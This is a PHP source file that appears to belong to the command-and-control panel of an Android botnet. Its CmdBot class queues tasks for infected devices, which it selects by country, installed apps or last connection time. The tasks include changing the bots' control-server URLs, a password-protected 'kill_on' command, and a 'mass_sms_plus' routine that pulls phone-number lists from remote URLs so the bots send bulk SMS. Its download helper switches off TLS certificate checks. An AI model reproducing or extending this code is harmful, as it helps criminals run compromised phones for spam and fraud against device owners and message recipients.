<?php
if(!defined('MODE')) hlp::show_404();
//~ require_once(dirname(__FILE__) . "/commands.php");
//~ require_once(dirname(__FILE__) . "/hlp.php");
 
if(!class_exists('CmdBot')) { 
class CmdBot {
	
	private $ajax;
		
	function __construct($ajax)
	{
		$this->ajax = $ajax;
		$this->db = $this->ajax->db;
		$cmd = new Commands();
	}
	
	function _set_command($cmd, $data)
	{
		if(!array_key_exists($cmd, Commands::$cmd))
			$this->ajax->show_response('Very bad command', 'Error');
		
		if(!isset($data['bot_params']))
			$data['bot_params'] = null;
			
		// Hacks
		if($cmd == 'api_server')
		{
			$rows = array();
			foreach(explode("\n", $data['bot_params']['u']) as $url)
			{
				$url = trim($url);
				if(!$url) continue;
				
				if(!hlp::startsWith($url, "https://"))
					$this->ajax->show_response('Bad URL format: ' . $url, 'Error');
					
				$rows[] = $url;
			}
			
			$rows = array_unique($rows);
			$data['bot_params']['text'] = implode('|', $rows);
			
		}else if($cmd == 'kill_on'){
			$data['bot_params']['p'] = "password:" . $data['bot_params']['p'];
		}

		$to_bot = array(
			'mn' => Commands::$cmd[$cmd]['bot_cmd'],
			'p' => ($data['bot_params'])? $data['bot_params'] : array("no_params"=>"true"),
			//~ 'ts' => time(),
		);
		
		$bots = array();
		if($data['records'] == 'ALL')
		{
			$sql = "select bot_id from bots";
			# apply filters
			if(isset($data['filter']) && sizeof($data['filter']))
			{
				$mod = new modBase($this->db);
				
				$data['filter']['country'] = strtolower($data['filter']['country']);
				
				// process time_connect 0, 1200, etc -- change to timestamp column
				$time_connect = (int) $data['filter']['time_connect'];
				unset($data['filter']['time_connect']);
				
				$contain_apps = hlp::list2array($data['filter']['appname']);
				unset($data['filter']['appname']);

				$sql = $mod->addWhere($sql, $data['filter'], array('android', 'bot_id', 'country'), 'bots');
				
				// bots have apps
				if($contain_apps)
				{
					$sql_apps = "`bots`.`id` in( select bot_id from bot_apps where app_id in(select id from apps where name ";
					
					// 1 app searching with LIKE, more apps with IN()
					if(sizeof($contain_apps) == 1)
						$sql_apps .= "like({$this->db->quote_like($contain_apps[0])})";
					else
					{
						$contain_apps = array_map(array($this->db, 'quote'), $contain_apps);
						$apps_names = implode(",", $contain_apps);
						$sql_apps .= "in ({$apps_names})";
					}
					
					$sql_apps .= "))";
					$sql = $mod->addWhere($sql, $sql_apps);
				}
				
				// last time connect
				if($time_connect)
				{
					$sql_time_connect = "`bots`.`timestamp` > date_sub(now(), interval {$time_connect} second)";
					$sql = $mod->addWhere($sql, $sql_time_connect);
				}

			}

			$res = $this->db->exec($sql, null, true);
			if($res)
			foreach($res as $row)
				$bots[] = $row['bot_id'];
				
		}else{
			$parts = explode(",", $data['records']);
			foreach($parts as $part)
				if(preg_match("/([0-9A-z]{32})/", $part))
					$bots[] = $part;
		}
		
		$sql = "insert into bot_tasks values(null, :bot_id, :command, 'pending', '', NOW(), NULL)";
		
		if($bots)
		foreach($bots as $bot_id)
		{
			$cmd_fields = $to_bot;
			
			if($cmd == 'mass_sms_plus')
			{
				$limit = (isset($data['bot_params']['l']) && $data['bot_params']['l'] != 0)? (int) $data['bot_params']['l'] : null;
				
				$sql_get = "SELECT value FROM config WHERE name='mass_sms_urls_list'";
				$db_res = $this->db->exec($sql_get, null, true)[0];
				$urls = explode("\n", $db_res['value']);
				
				if(!sizeof($urls))
					continue;
					
				$url = array_pop($urls);
				$db_params = array(
					array(':urls', implode("\n", $urls), PDO::PARAM_STR),
				);
				$sql_put = "UPDATE config SET value=:urls WHERE name='mass_sms_urls_list'";
				$this->db->exec($sql_put, $db_params);
				
				$response = $this->download_url($url);
				
				$rows = explode("\n", $response);
				$numbers = array();

				foreach($rows as $row)
				{
					if($limit != null && sizeof($numbers) >= $limit)
						break;
						
					$row = trim($row);
					if(preg_match("#".modBase::$filters['phone']."#", $row))
						$numbers[] = $row;
				}
				
				if(!sizeof($numbers))
					continue;
					
				$cmd_fields['p']['nn'] = implode("|", $numbers);
			}
			
			$params = array(
				array(':command', json_encode($cmd_fields), PDO::PARAM_STR),
				array(':bot_id', $bot_id, PDO::PARAM_STR, 32),
			);
			
			$this->db->exec($sql, $params);
		}
		
		// bot info page shows only errors, not every "task set"
		if($data['context'] == 'bot')
			$this->ajax->show_response('Task has been set', 'SMALL_MSG');
		else{
			$sz = sizeof($bots);
			$bots_text = "{$sz} bot";
			if($sz > 1)
				$bots_text .= "s";
				
			$this->ajax->show_response("Task has been set to {$bots_text}", 'SMALL_MSG');
		}
	}

	function download_url($url)
	{
		if(!hlp::startsWith($url, "http"))
			return "";
			
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_VERBOSE, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$response = curl_exec($ch);
		curl_close($ch);
		return $response;
	}
}

} // end class exists











